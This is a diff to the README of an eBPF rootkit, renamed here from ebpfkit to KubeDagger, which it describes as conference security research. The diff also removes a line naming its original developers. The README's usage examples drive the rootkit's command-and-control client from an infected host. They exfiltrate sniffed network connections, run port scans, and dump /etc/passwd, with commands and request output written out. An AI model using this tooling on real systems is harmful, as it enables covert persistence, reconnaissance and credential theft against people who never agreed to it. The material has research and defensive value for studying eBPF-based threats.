@@ -5,12 +5,12 @@
 [![License: GPL v2](https://img.shields.io/badge/License-GPL%20v2-blue.svg)](https://www.gnu.org/licenses/old-licenses/gpl-2.0.en.html)
 [![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
 
-`kubedagger` is a rootkit that leverages multiple eBPF features to implement offensive security techniques. We implemented most of the features you would expect from a rootkit: obfuscation techniques, container breakouts, persistent access, command and control, pivoting, network scanning, Runtime Application Self-Protection (RASP) bypass, etc.
+`KubeDagger` is a rootkit that leverages multiple eBPF features to implement offensive security techniques. We implemented most of the features you would expect from a rootkit: obfuscation techniques, container breakouts, persistent access, command and control, pivoting, network scanning, Runtime Application Self-Protection (RASP) bypass, etc.
 
 This rootkit was presented at [BlackHat USA 2021: With Friends Like eBPF, Who Needs Enemies?](https://www.blackhat.com/us-21/briefings/schedule/#with-friends-like-ebpf-who-needs-enemies-23619) and [Defcon 29: eBPF, I thought we were friends !](https://defcon.org/html/defcon-29/dc-29-speakers.html#fournier). While we presented our container breakouts at BlackHat, you'll want to check out our Defcon talk to see a demo of the network scanner and the RASP bypass. Slides and recordings of the talks will be available soon.
 
 ## **Disclaimer**
-This project is **not** an official Datadog product (experimental or otherwise), it is just code that happens to be developed by Datadog employees as part of an independent security research project. The rootkit herein is provided for educational purposes only and for those who are willing and curious to learn about ethical hacking, security and penetration testing with eBPF.
+ The rootkit herein is provided for educational purposes only and for those who are willing and curious to learn about ethical hacking, security and penetration testing with eBPF.
 
 **Do not attempt to use these tools to violate the law. The author is not responsible for any illegal action. Misuse of the provided information can result in criminal charges.**
 
@@ -31,7 +31,7 @@ This project is **not** an official Datadog product (experimental or otherwise),
 # ~ make
 ```
 
-2) To install `ebpfkit-client` (copies `ebpfkit-client` to `/usr/bin/`), run:
+2) To install `KubeDagger-client` (copies `KubeDagger-client` to `/usr/bin/`), run:
 ```shell script
 # ~ make install_client
 ```
@@ -75,12 +75,12 @@ Usage of ./bin/webapp:
 # ~ ./bin/webapp
 ```
 
-Once both `ebpfkit` and the `webapp` are running, you can start using `ebpfkit-client`. Run `ebpfkit-client -h` to get help.
+Once both `ebpfkit` and the `webapp` are running, you can start using `KubeDagger-client`. Run `KubeDagger-client -h` to get help.
 
 ```shell script
-# ~ ebpfkit-client -h
+# ~ KubeDagger-client -h
 Usage:
-  ebpfkit-client [command]
+  KubeDagger-client [command]
 
 Available Commands:
   docker            Docker image override configuration
@@ -91,11 +91,11 @@ Available Commands:
   postgres          postgresql authentication control
 
 Flags:
-  -h, --help               help for ebpfkit-client
+  -h, --help               help for KubeDagger-client
   -l, --log-level string   log level, options: panic, fatal, error, warn, info, debug or trace (default "info")
   -t, --target string      target application URL (default "http://localhost:8000")
 
-Use "ebpfkit-client [command] --help" for more information about a command.
+Use "KubeDagger-client [command] --help" for more information about a command.
 ```
 
 ## Examples
@@ -105,10 +105,10 @@ We also demonstrate 2 container breakouts during our [BlackHat talk](https://www
 
 ### Exfiltrate passive network sniffing data
 
-On startup, by default, the rookit will start listening passively for all the network connections made to and from the infected host. You can periodically poll that data using the `network_discovery` command of `ebpfkit-client`. It may take a while to extract everything so be patient ...
+On startup, by default, the rookit will start listening passively for all the network connections made to and from the infected host. You can periodically poll that data using the `network_discovery` command of `KubeDagger-client`. It may take a while to extract everything so be patient ...
 
 ```shell script
-# ~ ebpfkit-client -l debug network_discovery get
+# ~ KubeDagger-client -l debug network_discovery get
 DEBUG[2021-08-04T10:10:46Z]
 GET /get_net_dis HTTP/1.1
 Host: localhost:8000
@@ -157,12 +157,12 @@ The final step is to generate the *svg* file. We used the `fdp` layout of [Graph
 
 ### Run a port scan on 10.0.2.3, from port 7990 to 8010
 
-> Note: for this feature to work, you cannot run `ebpfkit-client` locally. If you're running the rootkit in a guest VM, expose the webapp port (default 8000) of the guest VM to the host and make the `ebpfkit-client` request from the host.
+> Note: for this feature to work, you cannot run `KubeDagger-client` locally. If you're running the rootkit in a guest VM, expose the webapp port (default 8000) of the guest VM to the host and make the `KubeDagger-client` request from the host.
 
 To request a port scan, use the `network_discovery` command. You can specify the target IP, start port and port range.
 
 ```shell script
-# ~ ebpfkit-client -l debug network_discovery scan --ip 10.0.2.3 --port 7990 --range 20
+# ~ KubeDagger-client -l debug network_discovery scan --ip 10.0.2.3 --port 7990 --range 20
 DEBUG[2021-08-04T11:59:46Z]
 GET /get_net_sca HTTP/1.1
 Host: localhost:8000
@@ -204,7 +204,7 @@ On the infected host, you should see debug logs in `/sys/kernel/debug/tracing/tr
 Once the scan is finished, you can exfiltrate the scan result using the `network_discovery` command. You need to add the `active` flag to request the network traffic generated by the network scan. It may take a while to extract everything so be patient ...
 
 ```shell script
-# ~ ebpfkit-client -l debug network_discovery get --active
+# ~ KubeDagger-client -l debug network_discovery get --active
 DEBUG[2021-08-04T09:49:15Z]
 GET /get_net_dis HTTP/1.1
 Host: localhost:8000
@@ -261,10 +261,10 @@ The final step is to generate the *svg* file. We used the `fdp` layout of [Graph
 
 ### Dump the content of /etc/passwd
 
-This is a 3 steps process. First you need to ask the rootkit to start looking for `/etc/passwd`. You can use the `fs_watch` command of `ebpfkit-client` to do that.
+This is a 3 steps process. First you need to ask the rootkit to start looking for `/etc/passwd`. You can use the `fs_watch` command of `KubeDagger-client` to do that.
 
 ```shell script
-# ~ ebpfkit-client -l debug fs_watch add /etc/passwd
+# ~ KubeDagger-client -l debug fs_watch add /etc/passwd
 DEBUG[2021-08-04T10:14:52Z]
 GET /add_fswatch HTTP/1.1
 Host: localhost:8000
@@ -278,7 +278,7 @@ Then, you need to wait until a process on the infected host opens and reads `/et
 Finally, you can exfiltrate the content of the file using the `fs_watch` command again.
 
 ```shell script
-# ~ ebpfkit-client -l debug fs_watch get /etc/passwd
+# ~ KubeDagger-client -l debug fs_watch get /etc/passwd
 DEBUG[2021-08-04T10:18:35Z]
 GET /get_fswatch HTTP/1.1
 Host: localhost:8000
